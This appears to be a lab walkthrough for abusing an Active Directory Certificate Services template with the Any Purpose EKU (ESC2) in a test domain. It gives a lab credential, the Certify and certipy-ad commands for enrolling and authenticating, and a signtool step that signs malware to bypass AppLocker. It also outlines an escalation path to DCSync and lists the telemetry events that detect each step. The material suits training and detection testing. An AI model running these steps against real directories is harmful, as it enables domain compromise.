# WT#051 — ESC2: Any Purpose EKU

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC2 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, Certify |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC2` template published with Any Purpose EKU (1.3.6.1.4.1.311.10.3.13)
- `analyst_dfir` has Enroll permission on `CADRE-ESC2`

## Attack Steps

### 1. Enumerate ESC2 template
```powershell
Certify.exe find /ca:dc01.cadre.local\cadre-CA /template:CADRE-ESC2
```

### 2. Request certificate (Any Purpose enables code signing + client auth)
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC2 -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Use certificate for client auth
```powershell
certipy-ad auth -pfx analyst_dfir.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 4. Escalate via code signing (optional)
Sign a malicious executable with the Any Purpose cert to bypass AppLocker/CEP:
```powershell
signtool.exe sign /fd SHA256 /a /f analyst_dfir.pfx /p "" malware.exe
```

## Post-Exploitation Chain
ESC2 → Client authentication → Kerberos TGT → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: CADRE-ESC2 enrollment by analyst_dfir
- **Event 4889**: Certificate issued with Any Purpose EKU
- **Event 4688**: certipy-ad.exe or Certify.exe execution
- **Sysmon Event 11**: PFX file created on disk
## Status
CONFIGURED — CA cadre-CA running, ESC2 template published
